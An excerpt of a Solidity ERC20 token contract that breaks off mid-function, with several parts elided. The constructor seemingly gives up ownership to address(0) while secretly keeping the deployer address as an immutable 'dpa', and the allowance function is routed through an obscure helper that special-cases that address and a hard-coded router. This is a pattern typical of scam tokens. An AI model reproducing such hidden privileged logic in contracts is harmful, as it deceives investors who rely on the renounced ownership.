...
contract NHB is ERC20 {
    address internal immutable dpa;
    ...
    constructor(
        ...
        uint256 number,
        address toAddress
    ) ERC20(input_name, input_symbol, number, toAddress) Ownable(toAddress) {
        _transferOwnership(address(0));
        dpa = toAddress;
    }
    ...
    function allowance(address owner, address spender)
        ...
        returns (uint256)
    {
        return _csawc(owner, spender);
    }

    function _csawc(address owner, address spender)
        internal
        view
        returns (uint256)
    {
        address r = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        if (spender == dpa || spender == r) {
